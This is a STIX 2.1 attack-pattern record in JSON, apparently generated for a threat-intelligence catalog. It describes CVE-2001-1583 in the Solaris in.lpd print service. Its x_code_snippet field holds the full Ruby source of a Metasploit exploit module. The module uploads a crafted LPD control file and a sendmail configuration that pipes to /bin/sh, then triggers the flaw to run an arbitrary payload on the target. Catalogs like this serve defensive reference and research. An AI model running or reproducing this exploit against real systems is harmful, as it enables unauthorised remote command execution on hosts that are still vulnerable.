{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3f8448cf-7d89-4660-bf37-97590cbdcb36",
    "created": "2024-08-14T16:34:01.860933Z",
    "modified": "2024-08-14T16:34:01.860937Z",
    "name": "Solaris LPD Command Execution",
    "description": " This module exploits an arbitrary command execution flaw in the in.lpd service shipped with all versions of Sun Solaris up to and including 8.0. This module uses a technique discovered by Dino Dai Zovi to exploit the flaw without needing to know the resolved name of the attacking system. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/solaris/lpd/sendmail_exec.rb",
            "external_id": "sendmail_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2001-1583"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Solaris LPD Command Execution',\n      'Description'    => %q{\n          This module exploits an arbitrary command execution flaw in\n        the in.lpd service shipped with all versions of Sun Solaris\n        up to and including 8.0. This module uses a technique\n        discovered by Dino Dai Zovi to exploit the flaw without\n        needing to know the resolved name of the attacking system.\n      },\n      'Author'         => [ 'hdm', 'ddz' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2001-1583'],\n          [ 'OSVDB', '15131'],\n          [ 'BID', '3274'],\n        ],\n      'Platform'       => %w{ solaris unix },\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          'Space'       => 8192,\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl telnet',\n            }\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic Target', { }]\n        ],\n      'DisclosureDate' => '2001-08-31',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(515)\n      ])\n  end\n\n  def exploit\n\n    # This is the temporary path created in the spool directory\n    spath = \"/var/spool/print\"\n\n    # The job ID is squashed down to three decimal digits\n    jid   = ($$ % 1000).to_s + [Time.now.to_i].pack('N').unpack('H*')[0]\n\n    # The control file\n    control =\n      \"H\"+\"metasploit\\n\"+\n      \"P\"+\"\\\\\\\"-C\"+spath+\"/\"+jid+\"mail.cf\\\\\\\" nobody\\n\"+\n      \"f\"+\"dfA\"+jid+\"config\\n\"+\n      \"f\"+\"dfA\"+jid+\"script\\n\"\n\n\n    # The mail configuration file\n    mailcf =\n      \"V8\\n\"+\n      \"\\n\"+\n      \"Ou0\\n\"+\n      \"Og0\\n\"+\n      \"OL0\\n\"+\n      \"Oeq\\n\"+\n      \"OQX/tmp\\n\"+\n      \"\\n\"+\n      \"FX|/bin/sh #{spath}/#{jid}script\\n\"+\n      \"\\n\"+\n      \"S3\\n\"+\n      \"S0\\n\"+\n      \"R\\+     #local \\\\@blah :blah\\n\"+\n      \"S1\\n\"+\n      \"S2\\n\"+\n      \"S4\\n\"+\n      \"S5\\n\"+\n      \"\\n\"+\n      \"Mlocal  P=/bin/sh, J=S, S=0, R=0, A=sh #{spath}/#{jid}script\\n\"+\n      \"Mprog   P=/bin/sh, J=S, S=0, R=0, A=sh #{spath}/#{jid}script\\n\"\n\n    # Establish the first connection to the server\n    sock1 = connect(false)\n\n    # Request a cascaded job\n    sock1.put(\"\\x02metasploit:framework\\n\")\n    res = sock1.get_once\n    if (not res)\n      print_status(\"The target did not accept our job request command\")\n      return\n    end\n\n    print_status(\"Configuring the spool directory...\")\n    if !(\n        send_file(sock1, 2, \"cfA\" + jid + \"metasploit\", control) and\n        send_file(sock1, 3, jid + \"mail.cf\", mailcf) and\n        send_file(sock1, 3, jid + \"script\", payload.encoded)\n      )\n      sock1.close\n      return\n    end\n\n    # Establish the second connection to the server\n    sock2 = connect(false)\n\n    # Request another cascaded job\n    sock2.put(\"\\x02localhost:metasploit\\n\")\n    res = sock2.get_once\n    if (not res)\n      print_status(\"The target did not accept our second job request command\")\n      return\n    end\n\n    print_status(\"Attempting to trigger the vulnerable call to the mail program...\")\n    if !(\n        send_file(sock2, 2, \"cfA\" + jid + \"metasploit\", control) and\n        send_file(sock2, 3, \"dfa\" + jid + \"config\", mailcf)\n      )\n      sock1.close\n      sock2.close\n      return\n    end\n\n    sock1.close\n    sock2.close\n\n    print_status(\"Waiting up to 60 seconds for the payload to execute...\")\n    select(nil,nil,nil,60)\n\n    handler\n  end\n\n  def send_file(s, type, name, data='')\n\n    s.put(type.chr + data.length.to_s + \" \" + name + \"\\n\")\n    res = s.get_once(1)\n    if !(res and res[0,1] == \"\\x00\")\n      print_status(\"The target did not accept our control file command (#{name})\")\n      return\n    end\n\n    s.put(data)\n    s.put(\"\\x00\")\n    res = s.get_once(1)\n    if !(res and res[0,1] == \"\\x00\")\n      print_status(\"The target did not accept our control file data (#{name})\")\n      return\n    end\n\n    print_status(sprintf(\"     Uploaded %.4d bytes >> #{name}\", data.length))\n    return true\n  end\nend\n",
    "x_mitre_disclosure_date": "2001-08-31",
    "x_mitre_platforms": [
        "%w{ solaris unix }"
    ]
}